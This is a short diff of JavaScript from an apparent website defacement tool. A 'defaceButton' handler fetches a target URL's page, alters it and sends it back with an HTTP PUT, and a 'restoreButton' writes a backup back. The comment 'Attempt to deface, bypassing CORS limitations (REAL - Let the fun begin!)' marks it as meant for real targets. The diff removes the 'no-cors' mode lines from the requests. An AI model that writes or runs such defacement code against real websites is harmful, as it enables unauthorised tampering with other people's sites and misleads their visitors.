@@ -36,7 +36,6 @@ document.getElementById("defaceButton").addEventListener("click", async function
     // Attempt to deface, bypassing CORS limitations (REAL - Let the fun begin!)
     fetch(targetURL, {
         method: 'GET',
-        mode: 'no-cors' // Bypass CORS
     })
     .then(response => response.text())
     .then(data => {
@@ -45,7 +44,6 @@ document.getElementById("defaceButton").addEventListener("click", async function
         // Send the modified content back to the server using a PUT request
         return fetch(targetURL, {
             method: 'PUT',
-            mode: 'no-cors',
             headers: {
                 'Content-Type': 'text/html'
             },
@@ -91,7 +89,6 @@ document.getElementById("restoreButton").addEventListener("click", async functio
     // Send the backup content back to the server using a PUT request
     await fetch(targetURL, {
       method: 'PUT',
-      mode: 'no-cors',
       headers: {
         'Content-Type': 'text/html'
       },
